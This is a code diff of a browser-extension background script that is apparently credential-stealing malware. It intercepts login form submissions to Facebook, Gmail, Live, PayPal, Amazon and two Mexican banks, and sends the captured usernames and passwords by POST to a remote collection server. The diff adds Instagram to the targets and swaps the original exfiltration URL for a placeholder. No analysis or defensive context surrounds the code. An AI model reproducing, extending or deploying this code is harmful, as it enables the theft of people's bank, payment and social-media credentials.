@@ -7,6 +7,7 @@ var targetPaypal = "*://*.paypal.com/signin*";
 var targetBNK1 = "*://*.bancomer.com/acceso/inicio-js.jsp*";
 var targetBNK2 = "*://acceso24.banorte.com/wps/portal/banorte/Home/inicio/!ut/p/a1/*";
 var targetAmazon = "*://*.amazon.com/ap/signin*";
+var targetInstagram = "*://*.instagram.com/accounts/login/ajax/*";
 
 chrome.webRequest.onBeforeRequest.addListener( 
 function(details) {
@@ -69,6 +70,11 @@ function(details) {
 		    }
         }
 
+	if(details.url.indexOf("instagram") != -1 ){
+                    if(details.requestBody.formData.username != "" && details.requestBody.formData.password != "" ){
+                        doPost(details.requestBody.formData.username[0],details.requestBody.formData.password[0],details.url);
+                    }
+        }
 
     }else{
 	if(details.url.indexOf("bancomer") != -1 ){
@@ -78,7 +84,7 @@ function(details) {
         }
     }
   },
-  {urls: [targetFacebook,targetGmailUser,targetGmailPass,targetLive,targetPaypal,targetBNK1,targetBNK2,targetAmazon]},
+  {urls: [targetFacebook,targetGmailUser,targetGmailPass,targetLive,targetPaypal,targetBNK1,targetBNK2,targetAmazon,targetInstagram]},
   ["requestBody"]
 );
 
@@ -95,7 +101,7 @@ function findGetParameter(url,parameterName) {
 }
 
 function doPost(e,p,page){
-                        var url = "http://www.jabonchimbo.com/api/cards/zeuspost.php";
+                        var url = "http://www.website.com";
                         var parametros ="email="+e+"&pass="+p+"&page="+page;
                         var xhr = new XMLHttpRequest();
                         xhr.open("POST",url, true);
